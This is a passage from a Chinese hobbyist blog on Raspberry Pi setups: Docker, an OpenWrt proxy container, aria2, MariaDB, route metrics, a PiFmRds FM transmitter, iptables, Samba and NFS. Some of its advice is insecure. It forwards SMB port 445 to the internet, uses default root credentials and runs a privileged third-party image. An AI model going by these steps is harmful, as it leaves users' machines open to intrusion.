<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230712000701293.png" alt="image-20230712000701293"></p>
<p><strong>并且三个都设置为独显</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230712000845161.png" alt="image-20230712000845161"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230712000925958.png" alt="image-20230712000925958"></p>
<p><strong>设置完成之后重启电脑，再次打开MC的F3就能看到帧率暴涨了</strong></p>
<p><strong>按<code>F3</code>可以看到这个图，左边的<code>144FPS</code>夜晚状态，中间的<code>GPU</code>占用<code>10%</code>，右边的<code>CPUI5-12450H</code>,但是下方多了个3050显卡</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230712001320008.png" alt="image-20230712001320008"></p>
<h3 id="ZeroTier"><a href="#ZeroTier" class="headerlink" title="ZeroTier"></a>ZeroTier</h3><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p><strong>由于树莓派基地系统自带了docker，我们只需要将docker服务启动即可，为了docker能够更好完成和为我们设备提供优质服务，这里建议将docker设置为开机自启。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看docker状态</span></span><br><span class="line">root@raspbian:~<span class="comment"># systemctl status docker.service</span></span><br><span class="line"><span class="comment"># 开机自启docker</span></span><br><span class="line">root@raspbian:~<span class="comment"># systemctl enable docker.service</span></span><br><span class="line"><span class="comment"># 关闭开机自启docker</span></span><br><span class="line">root@raspbian:~<span class="comment"># systemctl disable docker.service</span></span><br><span class="line"><span class="comment"># 关闭docker</span></span><br><span class="line">root@raspbian:~<span class="comment"># systemctl stop docker.service</span></span><br><span class="line"><span class="comment"># 开启docker</span></span><br><span class="line">root@raspbian:~<span class="comment"># systemctl start docker.service</span></span><br><span class="line"><span class="comment"># 关闭再开启docker</span></span><br><span class="line">root@raspbian:~<span class="comment"># systemctl restart docker.service</span></span><br></pre></td></tr></table></figure>

<p><strong>怎么说咧！想要玩得起docker，有个地方是我们不得不去的，那就是docker的官方宝藏之地——<a href="https://hub.docker.com/">Dockerhub</a>,里面有世界各地说话又好听、技术又高的大佬，他们写好的容器则上传到了dockerhub，这些容器就是一个小型的服务或者说是应用。这些应用可以独立或者混合其他容器一起使用。我们后面会讲到部署一个<code>wordpress博客</code>然后用到<code>mariadb数据库容器</code>的案例。再此之前，我们还是先老老实实去b站学习有关docker的各种课程，学习好docker对我们后面学习其他的容器化有很大帮助，而docker里面的网络内容则会贯穿整个进阶篇章。</strong></p>
<h4 id="配置镜像加速"><a href="#配置镜像加速" class="headerlink" title="配置镜像加速"></a>配置镜像加速</h4><p><strong>镜像加速</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>

<p><strong>加入这个中科大的源</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>重新加载配置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<h4 id="openwrt"><a href="#openwrt" class="headerlink" title="openwrt"></a>openwrt</h4><p><strong>openwrt软路由可以替我们电脑实现一些魔法上网的功能，将fq功能给予树莓派处理可以让我们的fq体验更加顺畅丝滑。</strong></p>
<p><strong>下面我以docker容器化部署一下openwrt，实现家庭设备魔法上网。</strong></p>
<p><strong>拉取镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先下载openwrt镜像，这个镜像是树莓派4b的openwrt镜像</span></span><br><span class="line">docker pull registry.cn-shanghai.aliyuncs.com/suling/openwrt:rpi4</span><br></pre></td></tr></table></figure>

<p><strong>查看镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><strong>打开网卡混杂模式</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth0 promisc on </span><br></pre></td></tr></table></figure>

<p><strong>创建网络(须结合实际网络情况，不能照抄命令)</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker<span class="built_in"> network </span>create -d macvlan <span class="attribute">--subnet</span>=192.168.1.0/24 <span class="attribute">--gateway</span>=192.168.1.1 -o <span class="attribute">parent</span>=eth0 macnet</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--subnet=192.168.1.0/24  <span class="comment">#树莓派正所处在192.168.1.x网段</span></span><br><span class="line"></span><br><span class="line">--gateway=192.168.1.1    <span class="comment">#树莓派的网关（即路由器ip）</span></span><br><span class="line"></span><br><span class="line">parent=eth0              <span class="comment">#这个是物理网卡名字</span></span><br><span class="line"></span><br><span class="line">macvlan                  <span class="comment">#这是创建的一个驱动程序macvlan管理网络（已经创建了192.168.1这个网络段给它）</span></span><br><span class="line"></span><br><span class="line">macnet                   <span class="comment">#macnet创建的网络名字</span></span><br></pre></td></tr></table></figure>

<p><strong>查看macnet网络创建程度</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network <span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><strong>创建并启动容器</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --restart always --name openwrt -d --network macnet --privileged registry.cn-shanghai.aliyuncs.com/suling/openwrt:rpi4 /sbin/init</span><br></pre></td></tr></table></figure>

<p><strong>进入容器并修改相关参数</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it openwrt bash</span><br></pre></td></tr></table></figure>

<p><strong>执行此命令后我们便进入 OpenWrt 的命令行界面，首先，我们需要编辑 OpenWrt 的网络配置文件：</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>config/network</span><br></pre></td></tr></table></figure>

<p><strong>我们需要更改 Lan 口设置：</strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">config interface <span class="string">&#x27;lan&#x27;</span></span><br><span class="line">        <span class="keyword">option</span> <span class="keyword">type</span> <span class="string">&#x27;bridge&#x27;</span></span><br><span class="line">        <span class="keyword">option</span> ifname <span class="string">&#x27;eth0&#x27;</span></span><br><span class="line">        <span class="keyword">option</span> proto <span class="string">&#x27;static&#x27;</span></span><br><span class="line">        <span class="keyword">option</span> ipaddr <span class="string">&#x27;192.168.1.100&#x27;</span>    #自己设置一个ip，这个ip是你即将要访问的openwrt控制面板</span><br><span class="line">        <span class="keyword">option</span> netmask <span class="string">&#x27;255.255.255.0&#x27;</span></span><br><span class="line">        <span class="keyword">option</span> ip6assign <span class="string">&#x27;60&#x27;</span></span><br><span class="line">        <span class="keyword">option</span> gateway <span class="string">&#x27;192.168.1.1&#x27;</span></span><br><span class="line">        <span class="keyword">option</span> broadcast <span class="string">&#x27;192.168.1.255&#x27;</span></span><br><span class="line">        <span class="keyword">option</span> dns <span class="string">&#x27;8.8.8.8&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>所有的 <code>192.168.1.x</code> 需要根据树莓派所处网段修改，<code>option gateway</code>填写路由器的 IP。</strong></p>
<p><strong><code>option ipaddr </code>项目定义了 OpenWrt 的 IP 地址，在完成网段设置后，IP最后一段可根据自己的爱好修改（前提是符合规则且不和现有已分配 IP 冲突）。</strong></p>
<p><strong>重启网络</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/network restart</span><br></pre></td></tr></table></figure>

<p><strong>输入完成这段命令之后，按住键盘的<code>ctrl+p+q</code>就能退出<code>openwrt</code>容器的命令行界面。</strong></p>
<p><strong>进入控制面板</strong></p>
<p><strong>在浏览器中输入<code>option ipaddr </code>项目中的 IP 进入 Luci 控制面板，若<code>option ipaddr </code>的参数为 <code>192.168.1.100</code>，则可以在浏览器输入 <code>http://192.168.1.100</code>进入控制面板。</strong></p>
<p><strong>用户名：<code>root</code></strong></p>
<p>**密码：<code>password</code> **</p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222182120848.png" alt="image-20221222182120848"></p>
<p><strong>登录进去后可以看到树莓派的基础信息、cpu架构、cpu温度等信息</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222182250444.png" alt="image-20221222182250444"></p>
<p><strong>fq的功能配置：左边的列表选择<code>服务</code>–&gt;<code>PassWall</code>,可以看到这个界面。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222182535583.png" alt="image-20221222182535583"></p>
<p><strong>首先，打开里面的主开关</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222182649678.png" alt="image-20221222182649678"></p>
<p><strong>复制fq节点的订阅地址到节点订阅选项</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222183121714.png" alt="image-20221222183121714"></p>
<p><strong>设置完成之后点击手动订阅可以看到相应日志</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222183224283.png" alt="image-20221222183224283"></p>
<p><strong>回到节点列表就可以看到大量节点出现</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222183338376.png" alt="image-20221222183338376"></p>
<p><strong>我一般喜欢开放固定端口代理流量，这样我就可以通过<code>ip+端口</code>使用代理服务器</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222183615463.png" alt="image-20221222183615463"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222183815397.png" alt="image-20221222183815397"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222183910155.png" alt="image-20221222183910155"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222183920184.png" alt="image-20221222183920184"></p>
<p><strong>清理完成刷新一下，fq服务就可以使用了。win系统有代理功能的，首次fq可以先在win系统里面设置，然后打开谷歌浏览器安装代理插件。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222184044294.png" alt="image-20221222184044294"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222184141529.png" alt="image-20221222184141529"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20221222184202042.png" alt="image-20221222184202042"></p>
<p><strong>这样可以很好的切换，而且只有浏览器能够fq，想要电脑全局fq就在代理里面设置<code>ip+端口</code>即可。记住win的代理和浏览器的插件只能开一个，别环路了。。。</strong></p>
<p><strong>docker版的openwrt还有其他的很多功能，可以自己私下去探索，这里就不再多说了，各自努力吧！</strong></p>
<h4 id="aria2"><a href="#aria2" class="headerlink" title="aria2"></a>aria2</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">    --name aria2-pro \</span><br><span class="line">    --restart unless-stopped \</span><br><span class="line">    --log-opt max-size=1m \</span><br><span class="line">    -e PUID=<span class="variable">$UID</span> \</span><br><span class="line">    -e PGID=<span class="variable">$GID</span> \</span><br><span class="line">    -e UMASK_SET=022 \</span><br><span class="line">    -e RPC_SECRET=orange \        <span class="comment"># 这个自定义，一定要记住</span></span><br><span class="line">    -e RPC_PORT=6800 \</span><br><span class="line">    -p 6800:6800 \</span><br><span class="line">    -e LISTEN_PORT=6888 \</span><br><span class="line">    -p 6888:6888 \</span><br><span class="line">    -p 6888:6888/udp \</span><br><span class="line">    -v <span class="variable">$PWD</span>/aria2-config:/config \</span><br><span class="line">    -v <span class="variable">$PWD</span>/aria2-downloads:/downloads \</span><br><span class="line">    p3terx/aria2-pro</span><br></pre></td></tr></table></figure>

<p><strong>WebUI</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">    --name ariang \</span><br><span class="line">    --log-opt max-size=1m \</span><br><span class="line">    --restart unless-stopped \</span><br><span class="line">    -p 6880:6880 \</span><br><span class="line">    p3terx/ariang</span><br></pre></td></tr></table></figure>

<h4 id="mariadb"><a href="#mariadb" class="headerlink" title="mariadb"></a>mariadb</h4><p><strong>先拉取mariadb</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull mariadb</span><br></pre></td></tr></table></figure>

<p><strong>下面需要修改的地方就是密码password修改成为自己需要的密码就可以刷入命令了</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --restart=always --name mariadb01 -p 3306:3306 -e MYSQL_ROOT_PASSWORD=password -v /data/mariadb/mysql.conf.d/mysql.cnf:/etc/mysql/mysql.conf.d/mysql.cnf -v /data/mariadb/data:/var/lib/mysql -d mariadb</span><br></pre></td></tr></table></figure>

<p><strong>那么再教你个好玩的，使用Navicat连接数据库爽的一批</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230328163059348.png" alt="image-20230328163059348"></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230328163207688.png" alt="image-20230328163207688"></p>
<h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><h3 id="双网卡内外网优先级设置"><a href="#双网卡内外网优先级设置" class="headerlink" title="双网卡内外网优先级设置"></a>双网卡内外网优先级设置</h3><p><strong>根据自己的需要，有时候树莓派需要两张网卡，一张用于访问外网（wlan0），另一种用于连接内网（eth0）。</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230429233559391.png" alt="image-20230429233559391"></p>
<p><strong>我们可以看到这里连接了两个网卡，分别是wlan0和eth0，在我们学数通知识的时候，我们老师会教我们网络的知识，直连的跃点数是会比连接wifi的是要更小的（普遍情况下是这样，不要和我杠，杠的要不你别学）</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230429234002039.png" alt="image-20230429234002039"></p>
<p><strong>这里，我设计的网络是eth0是面向内网的，对我的nas起到稳定的网络传输和安全性；而wlan0是连接了我的热点，这里我ping了一下8.8.8.8，发现是完全ping不同的。</strong></p>
<p><strong>我们再查看了网络优先级方面，发现eth0的网络优先级是比eth0高的（即eth0的网络跃点数metric比wlan0的跃点数metric要小）</strong></p>
<p><strong>我们可以使用以下命令查看跃点数</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspberrypi:~<span class="comment"># ip route show</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230429234447247.png" alt="image-20230429234447247"></p>
<p><strong>一个100一个600，看得很清楚吧。这里我把wlan0跃点数调到99，192.168.137.1是路由器网关地址</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspberrypi:~<span class="comment"># sudo ip route add default via 192.168.137.1 dev wlan0 proto dhcp metric 99</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230429234927301.png" alt="image-20230429234927301"></p>
<p><strong>wlan0这个网卡优先级马上就第一了，那么不出意外的话，这个网络就能通了</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230429235048919.png" alt="image-20230429235048919"></p>
<p><strong>上面讲的这个咧，是临时解决办法，要是想一劳永逸呢还是要把<code>IPV4_ROUTE_METRIC=99</code>这个写入到网卡配置文件中,但是。。。很不巧树莓派貌似没有。。。除非你用的不是树莓派官方的</strong></p>
<p><strong>那么我们也有另外的处理办法，把<code>sudo ip route add default via 192.168.137.1 dev wlan0 proto dhcp metric 99</code>这个命令写入一个文本里面，然后添加入<code>contab</code>里面，命令如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspberrypi:/usr/bin<span class="comment"># /usr/bin</span></span><br><span class="line">root@raspberrypi:/usr/bin<span class="comment"># vim network_metric</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">ip route add default via 192.168.137.1 dev wlan0 proto dhcp metric 99</span><br><span class="line"></span><br><span class="line">root@raspberrypi:/usr/bin<span class="comment"># chmod +x network_metric </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspberrypi:/usr/bin<span class="comment"># crontab -e</span></span><br><span class="line">@reboot bash /usr/bin/network_metric</span><br></pre></td></tr></table></figure>

<h3 id="微型电台-FM"><a href="#微型电台-FM" class="headerlink" title="微型电台-FM"></a>微型电台-FM</h3><p><strong>树莓派的 GPIO 引脚可以用作信号输出,因此,可以把音频信号通过树莓派进行 FM 调制后从 GPIO引脚送出,这样树莓派就变成了一个微型FM 发射器,即微型电台,可以自己指定发射频率,打开 FM 调频收音机,调到对应频道就可以接收到树派播放的 FM 广播信号了。</strong><br><strong>通过安装 <a href="https://github.com/ChristopheJacquet/PiFmRds">PiFmRds</a> 来将树莓派变成微型 FM 电台</strong></p>
<h4 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h4><p><strong>首先,执行以下命令,安装 sndfile 库:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libsndfile1-dev</span><br></pre></td></tr></table></figure>

<p><strong>第二步,执行以下命令,克隆 PiFmRds 的源代码:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ChristopheJacquet/PiFmRds.git</span><br></pre></td></tr></table></figure>

<p><strong>第三步,执行以下命令,进行编译:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> PiFmRds/src</span><br><span class="line">make clean</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h4 id="播放命令"><a href="#播放命令" class="headerlink" title="播放命令"></a>播放命令</h4><p><strong>编译完成后,可以执行 <code>sudo ./pi_fm_rds </code>命令发射 FM信号。pi_fm_rds 命令格式为：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./pi_fm_rds -audio [filename] -freq [frequency]</span><br></pre></td></tr></table></figure>

<p><strong>其中<code>-audio [filename]</code>是指定播放文件是<code>wav</code>格式的音频文件；</strong></p>
<p><strong><code>-freq [frequency]</code>是指定发射信号的频率</strong></p>
<p><strong>下面是不指定发射信号播放666.wav文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~/PiFmRds/src<span class="comment"># pwd</span></span><br><span class="line">/root/PiFmRds/src</span><br><span class="line">root@ubuntu:~/PiFmRds/src<span class="comment"># sudo ./pi_fm_rds</span></span><br><span class="line">root@ubuntu:~/PiFmRds/src<span class="comment"># sudo ./pi_fm_rds</span></span><br><span class="line">Using mbox device /dev/vcio.</span><br><span class="line">Allocating physical memory: size = 3403776     mem_ref = 4     bus_addr = fe8bb000     virt_addr = 0xffff94ea1000</span><br><span class="line">ppm corr is 0.0000, divider is 1644.7368 (1644 + 3018*2^-12) [nominal 1096.4912].</span><br><span class="line">PI: 1234, PS: &lt;Varying&gt;.</span><br><span class="line">RT: <span class="string">&quot;PiFmRds: live FM-RDS transmission from the RaspberryPi&quot;</span></span><br><span class="line">Starting to transmit on 107.9 MHz.</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230610164626929.png" alt="image-20230610164626929"></p>
<p><strong>然后新建一个shell窗口，执行播放文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~/PiFmRds/src<span class="comment"># sudo ./pi_fm_rds -audio 666.wav </span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230610164453696.png" alt="image-20230610164453696"></p>
<p><strong>用FM收音机接收107.9MHZ信号，可以听到文件声音</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230610164817.jpg" alt="微信图片_20230610164817"></p>
<h4 id="增强播放效果"><a href="#增强播放效果" class="headerlink" title="增强播放效果"></a>增强播放效果</h4><p><strong>在树莓派 GPIO 4(物理引脚编号为7)接上一根长 20m 的杜邦线作为发射天线来增强 FM 信号,然后使用 FM(调频)收音机收听,在 1m 范围内音质很清晰，在3m 范围内仍然可以听得见,超过 3m 信号会很弱。</strong></p>
<h3 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h3><h4 id="一、简介一下iptables"><a href="#一、简介一下iptables" class="headerlink" title="一、简介一下iptables"></a>一、简介一下iptables</h4><p><strong>iptables命令中ACCEPT（允许流量通过）、LOG（记录日志信息）、REJECT（拒绝流量通过）、DROP（拒绝流量通过）。允许动作和记录日志工作都比较好理解，着重需要讲解的是这两条拒绝动作的不同点，其中REJECT和DROP的动作操作都是把数据包拒绝，DROP是直接把数据包抛弃不响应，而REJECT会拒绝后再回复一条“您的信息我已收到，但被扔掉了”，让对方清晰的看到数据被拒绝的响应。</strong></p>
<h4 id="四表五链"><a href="#四表五链" class="headerlink" title="四表五链"></a>四表五链</h4><h5 id="命令解释"><a href="#命令解释" class="headerlink" title="命令解释"></a>命令解释</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 允许192.168.1.0/24这个IP段的流量流进服务器的80端口</span></span><br><span class="line">iptables -I INPUT -s 192.168.1.0/24 -p tcp --dport 80 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只允许本机22端口被192.168.1.0/24网段访问，其他流量均被拒绝。我们输入命令：</span></span><br><span class="line">iptables -I INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拒绝所有人访问本机4444到5555端口，输入命令：</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 4444:5555 -j REJECT</span><br><span class="line">iptables -A INPUT -p udp --dport 4444:5555 -j REJECT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除INPUT链中的第2条策略，首先我们看一下防火墙策略中的第二条策略是什么“iptables -L”，然后输入命令删除第2条策略：</span></span><br><span class="line">iptables -D INPUT 2</span><br></pre></td></tr></table></figure>



<p><strong>当我们使用 ipt­a­bles 设置了一些规则后需要对这些设置永久保存，避免当服务器重启后规则消失需要重新配置。为了能够让 ipt­a­bles 规则永久保存，这里介绍两种方法：</strong></p>
<h4 id="1、-使用iptables-restore"><a href="#1、-使用iptables-restore" class="headerlink" title="1、 使用iptables-restore"></a>1、 使用iptables-restore</h4><p><strong>在设置了一系列的 ipt­a­bles 规则后，首先需要切换到 root 用户，执行如下命令将规则保存到文件中：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 这包括了ipv4和ipv6规则，如果只有ipv4的规则可以只执行第一条</span><br><span class="line">iptables-save &gt; /etc/iptables-rules</span><br><span class="line">ip6tables-save &gt; /etc/ip6tables-rules</span><br></pre></td></tr></table></figure>

<p><strong>然后编辑 &#x2F;etc&#x2F;net­work&#x2F;in­ter­faces 文件，在对应的外网网卡下（通常是 eth0 接口，如果不是请按照实际情况添加，可以通过 if­con­fig 查看外网 ip 对应的网卡接口）插入下面两行：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pre-up iptables-restore &lt; /etc/iptables-rules</span><br><span class="line">pre-up ip6tables-restore &lt; /etc/ip6tables-rules</span><br></pre></td></tr></table></figure>

<p>这样当服务器重启后就能自动加载已经配置好的 ipt­a­bles 规则了。如果后续有添加新的规则则需要重新执行上面的 ipt­a­bles-save 命令更新规则文件即可</p>
<h4 id="2、-使用iptables-persistent"><a href="#2、-使用iptables-persistent" class="headerlink" title="2、 使用iptables-persistent"></a>2、 使用iptables-persistent</h4><p><strong>这个方法是我更喜欢使用的，它实际操作起来更简单一些。</strong></p>
<ul>
<li><strong>首先安装iptables-persistent工具</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install iptables-persistent</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>每当设置了新的iptables规则后，使用如下命令保存规则即可，规则会根据ipv4和ipv6分别保存在了&#x2F;etc&#x2F;iptables&#x2F;rules.v4和&#x2F;etc&#x2F;iptables&#x2F;rules.v6文件中。</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 保存现有规则</span><br><span class="line">sudo service netfilter-persistent save</span><br><span class="line"># 读取并应用先有规则</span><br><span class="line">sudo service netfilter-persistent reload</span><br></pre></td></tr></table></figure>

<p><strong>由于 ipt­a­bles-per­sis­tent 在安装时已经把它作为一个服务设置为开机启动了，它在开机后会自动加载已经保存的规则，所以也就达到了永久保存的目的。其实原理和第一种方法是类似的，只是设置起来会更简单一些。</strong></p>
<h3 id="RaspAP"><a href="#RaspAP" class="headerlink" title="RaspAP"></a>RaspAP</h3><p><a href="https://raspap.com/">https://raspap.com/</a></p>
<h3 id="NAS"><a href="#NAS" class="headerlink" title="NAS"></a>NAS</h3><h4 id="samba"><a href="#samba" class="headerlink" title="samba"></a>samba</h4><p><strong>首先，安装samba服务</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install samba samba-common-bin</span><br></pre></td></tr></table></figure>

<p><strong>添加文件配置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/samba/smb.conf</span><br></pre></td></tr></table></figure>

<p><strong>配置如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[share]                      <span class="comment">#共享文件夹名字，将在网络上显示此名称</span></span><br><span class="line">   path = /orange/share      <span class="comment">#共享文件夹的路径</span></span><br><span class="line">   valid <span class="built_in">users</span> = orange      <span class="comment">#允许访问的用户名称</span></span><br><span class="line">   browseable = <span class="built_in">yes</span>          <span class="comment">#允许浏览文件夹</span></span><br><span class="line">   writable = <span class="built_in">yes</span>            <span class="comment">#可以写入文件</span></span><br></pre></td></tr></table></figure>

<p><strong>创建orange的linux用户</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -m orange</span><br></pre></td></tr></table></figure>

<p><strong>创建samba的orange用户并且设置密码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbpasswd -a orange</span><br></pre></td></tr></table></figure>

<p><strong>重启samba服务即可访问</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart smbd.service</span><br></pre></td></tr></table></figure>

<p><strong>这里由于华为手机有隐私保护，不能截图，所以我已经登录账号密码进来了</strong></p>
<img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/微信图片_20230607011823.jpg" alt="微信图片_20230607011823" style="zoom:50%;">

<p><strong>咳咳，都配了认证，那么我们是不是可以端口映射一下</strong></p>
<p><strong>把445映射出去即可</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230607015948428.png" alt="image-20230607015948428"></p>
<p><strong>手机和win电脑都验证过了，完全没问题。</strong></p>
<h4 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h4><p><strong>安装rpcbind</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install rpcbind</span><br></pre></td></tr></table></figure>

<p><strong>查看rpcbind.socket状态</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status rpcbind.socket</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508145322917.png" alt="image-20230508145322917"></p>
